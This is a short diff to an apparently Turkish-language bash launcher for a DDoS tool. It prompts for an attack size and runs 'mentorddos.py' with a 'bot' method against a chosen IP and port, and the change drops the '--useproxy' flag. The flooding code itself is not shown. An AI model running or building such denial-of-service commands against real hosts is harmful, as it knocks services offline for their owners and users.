@@ -24,7 +24,7 @@ if [[ -e "YamanEfkar" ]]; then
 	read -p $'\e[31m[\e[32m!\e[31m]\e[37mSaldırı Boyutu [Default 135] : ' mb
 	echo -e ""
 	cd Script && 
-	python mentorddos.py --method "bot" --threads $mb --ip $ip --port $port --useproxy 
+	python mentorddos.py --method "bot" --threads $mb --ip $ip --port $port 
 else
 mkdir YamanEfkar
 apt update && apt upgrade -y 
